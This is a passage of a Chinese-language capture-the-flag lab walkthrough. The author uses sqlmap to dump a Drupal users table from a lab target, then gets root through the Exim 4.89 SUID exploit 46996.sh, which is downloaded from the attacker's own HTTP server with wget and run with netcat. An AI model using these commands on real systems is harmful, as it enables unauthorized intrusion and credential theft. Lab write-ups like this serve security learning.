```

sqlmap -u "http://192.168.132.155/?nid=1" --dbs --batch  
#查表：user
sqlmap -u "http://192.168.132.155/?nid=1" -D d7db -tables --batch
#查表数据
sqlmap -u "http://192.168.132.155/?nid=1" -D d7db -T users --dump
```

![](../Images/b8f9e8e633c4b97c1dd2ffd870936b8a.png)**提权**

尝试一下suid提权，搜索一下具有s权限的文件

exim是一款在Unix系统上使用的邮件服务，exim4在使用时具有root权限

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/4cbddc8bfd79c1db75e2a584404235f8.png)

查看exim4的版本，发现是4.89

```
exim --version
```

该版本的利用程序

将46996.sh复制到当前文件夹，并查看该文件

因为这个脚本是在windows下开发，所以需要先在本地进行编辑

本地编辑查看文件类型 :set ff?，会出现 dos或unix格式

如果为dos，需要改为unix模式使用 ：set ff=unix 修改文件格式 强制为unix格式，并保存退出

```
searchsploit exim 4 Privilege
searchsploit -m 46996.sh
vim 46996.sh
:set ff=unix
```

![](../Images/468b129e342c0a600e4081d7da93e61e.png)

该程序有俩种方法来获取root权限

现在需要将文件上传到靶机中

在本机的80端口打开一个web服务，把当前目录下的文件挂载上去

```
python3 -m http.server 80
```

![](../Images/375aa8255ca715b19e8de4def855de34.png)

将46996.sh下载至靶机

```
cd /tmp
wget 192.168.132.139/46996.sh
```

赋予46996.sh执行权限，并按照注释中提示的方法执行该程序

执行程序后等待一会儿就提权成功了

要注意的是如果没有提权成功可以多尝试几次

```
chmod +x 46996.sh
./46996.sh -m netcat
id
cd /root
cat flag.txt
```
